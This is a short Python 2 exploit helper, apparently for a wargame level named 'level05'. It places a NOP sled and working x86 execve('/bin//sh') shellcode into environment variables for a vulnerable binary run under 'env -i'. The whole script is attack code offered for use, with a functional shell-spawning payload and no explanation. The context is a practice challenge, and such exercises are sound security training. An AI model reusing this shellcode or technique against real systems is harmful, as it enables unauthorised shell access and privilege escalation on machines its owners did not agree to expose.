# env -i $(python env.py) /home/users/level05/level05
import os

rows, columns = os.popen('stty size', 'r').read().split()
pwd = os.getcwd()

xplt = "\x90"*0x200 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

print "COLUMNS=" + columns + " XPLT=" + xplt + " PWD=" + pwd +" LINES=" + rows
